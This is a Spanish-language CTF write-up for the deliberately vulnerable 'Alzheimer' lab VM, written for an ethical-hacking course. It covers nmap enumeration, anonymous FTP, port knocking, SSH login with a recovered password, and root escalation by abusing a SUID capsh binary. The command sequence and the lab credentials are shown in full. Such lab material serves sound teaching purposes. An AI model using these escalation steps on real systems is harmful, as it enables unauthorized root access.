---
title: "🖥️ Máquina: Alzheimer — Hacking Ético"
aliases:
  - Alzheimer
  - Máquina Alzheimer
  - VM Alzheimer
  - Writeup Alzheimer
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: Alzheimer

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** FTP anónimo · Port Knocking · Enumeración web · Escalada de privilegios (SUID / capsh)  
> **Descripción:** En esta práctica exploraremos un servidor Linux que emplea la técnica de port knocking para mantener sus servicios ocultos.
  Accederemos al FTP de forma anónima para obtener pistas, desbloquearemos los puertos ocultos, descubriremos credenciales y escalaremos privilegios abusando de un binario SUID.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.6`
* **`RHOST` (Víctima / Alzheimer):** Ej. `10.0.0.9`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Alzheimer tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos con un escaneo completo de puertos para descubrir qué servicios están activos en la máquina víctima:

```bash
nmap -sT -p- 10.0.0.9
```

> [!info] Resultado
> El escaneo revela tres puertos:
> · 21/tcp — FTP (abierto)
> · 22/tcp — SSH (filtrado)
> · 80/tcp — HTTP (filtrado)
> Los puertos 22 y 80 aparecen como filtrados, lo que significa que un firewall los está bloqueando activamente. Por ahora solo el FTP es accesible.

Lanzamos un escaneo más detallado para identificar versiones y configuraciones de los servicios encontrados:

```bash
nmap -v -A -p21,22,80 10.0.0.9
```

> [!info] Resultado
> Confirmamos que el FTP corre vsftpd 3.0.3 y tiene habilitado el login anónimo.
> Los puertos 22 y 80 siguen filtrados y no responden.

---

## 📂 Fase 2: Exploración del FTP anónimo

Nos conectamos al servicio FTP usando el usuario anonymous, que no requiere contraseña:

```bash
ftp 10.0.0.9
```

```bash
Name: anonymous
```

Listamos todos los archivos del directorio, incluyendo los ocultos (aquellos que empiezan por punto):

```bash
ftp> ls -la
```

> [!info] Resultado
> Encontramos un archivo oculto llamado .secretnote.txt. Los archivos que comienzan con . son ocultos en sistemas Linux y no aparecen con un ls normal, por eso es importante usar ls -la.

Lo leemos directamente desde la sesión FTP:

```bash
ftp> more .secretnote.txt
```

> [!info] Resultado
> El archivo contiene el siguiente mensaje:
> I need to knock this ports and one door will be open!
> 1000
> 2000
> 3000
> Es una pista directa para aplicar la técnica de port knocking: hay que "tocar" los puertos 1000, 2000 y 3000 en ese orden para que el sistema desbloquee los servicios ocultos.

---

## 🚪 Fase 3: Port Knocking

El port knocking es una técnica de seguridad que mantiene puertos cerrados hasta que se recibe una secuencia específica de conexiones a puertos concretos. El servidor monitoriza los intentos de conexión y, al detectar la secuencia correcta, modifica automáticamente las reglas del firewall para abrir los puertos protegidos.

Podemos realizarlo de dos formas. La primera, usando nmap con --max-retries 0 para enviar los paquetes sin esperar respuesta ni reintentos, lo que simula correctamente los "golpes":

```bash
nmap -p 1000,2000,3000 --max-retries 0 10.0.0.9
```

La segunda opción, más fiable y específicamente diseñada para esta técnica, es usar la herramienta knock. Si no está instalada:

```bash
sudo apt install knockd
```

```bash
knock 10.0.0.9 1000 2000 3000
```

> [!info] Resultado
> El port knocking no produce salida visible en el atacante, pero en el servidor ya ha surtido efecto. Volvemos a escanear para verificar el estado de los puertos:

```bash
nmap -sT -p- 10.0.0.9
```

> [!info] Resultado
> El efecto más importante del port knocking en esta máquina no es solo abrir los puertos: el servidor también ha modificado el contenido de .secretnote.txt en el FTP, añadiendo al final la contraseña del usuario del sistema. Volvemos al FTP a comprobarlo.

Reabrimos la sesión FTP y leemos de nuevo el archivo:

```bash
ftp 10.0.0.9
```

```bash
ftp> more .secretnote.txt
```

> [!info] Resultado
> El archivo ahora muestra una línea adicional al final:
> I need to knock this ports and one door will be open!
> 1000
> 2000
> 3000
> Ihavebeenalwayshere!!!
> La contraseña revelada es: Ihavebeenalwayshere!!!

---

## 🌐 Fase 4: Enumeración web

Con los puertos desbloqueados, confirmamos el nuevo estado de los servicios:

```bash
nmap -v -A -p21,22,80 10.0.0.9
```

> [!info] Resultado
> El puerto 80 ahora está abierto y corre nginx 1.14.2. El puerto 22 (SSH) también está accesible.

Inspeccionamos el contenido de la página web con curl:

```bash
curl http://10.0.0.9
```

> [!info] Resultado
> La respuesta contiene:
> I dont remember where I stored my password :(
> I only remember that was into a .txt file...
> -medusa
> <!---. --- - .... .. -. --. -->
> Identificamos dos elementos:
> · La firma -medusa nos revela el nombre de usuario del sistema.
> · El comentario HTML contiene lo que parece código morse. Al descodificarlo obtenemos una cadena sin sentido útil: se trata de un rabbit hole (pista falsa) diseñado para despistar. La contraseña real ya la obtuvimos del .secretnote.txt.

---

## 🔑 Fase 5: Acceso por SSH

Combinamos el usuario obtenido de la web (medusa) con la contraseña del .secretnote.txt y accedemos al sistema por SSH:

```bash
ssh medusa@10.0.0.9
```

```bash
Password: Ihavebeenalwayshere!!!
```

Una vez dentro, leemos la bandera del usuario:

```bash
cat user.txt
```

> [!info] Resultado
> Primera flag obtenida: HMVrespectmemories

---

## 🚀 Fase 6: Escalada de privilegios

El primer paso tras obtener acceso es comprobar si el usuario puede ejecutar algún comando como root sin contraseña:

```bash
sudo -l
```

> [!info] Resultado
> El resultado muestra que medusa puede ejecutar /bin/id como root. Sin embargo, id es un comando de solo lectura que únicamente imprime la identidad del proceso actual: no permite ejecutar nada ni abrir una shell, por lo que este vector no es útil para escalar privilegios. Debemos buscar otra vía.

Buscamos binarios con el bit SUID activo. Un binario SUID se ejecuta siempre con los privilegios de su propietario (normalmente root), independientemente del usuario que lo invoque. Si ese binario permite ejecutar comandos arbitrarios o lanzar una shell, podemos abusar de él para escalar privilegios:

```bash
find / -user root -perm /4000 2>/dev/null
```

> [!info] Resultado
> Entre los resultados encontramos /usr/sbin/capsh. Este binario forma parte de las herramientas de Linux capabilities y está diseñado para gestionar entornos con capacidades de seguridad. Al tener el bit SUID activo con propietario root, podemos usarlo para lanzar una shell con privilegios de root.

capsh acepta los parámetros --uid y --gid para definir con qué identidad ejecutar el entorno. El doble guión -- al final indica el inicio de la shell a lanzar (por defecto /bin/bash). Al ejecutarlo con --uid=0 --gid=0, le indicamos que establezca el contexto como root (UID 0, GID 0). Gracias al bit SUID, el binario ya corre con permisos de root, por lo que la shell resultante hereda esos privilegios:

```bash
/usr/sbin/capsh --gid=0 --uid=0 --
```

> [!info] Resultado
> Obtenemos una shell como root. Leemos la flag final:

```bash
cat /root/root.txt
```

> [!info] Resultado
> Flag de root: HMVlovememories

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
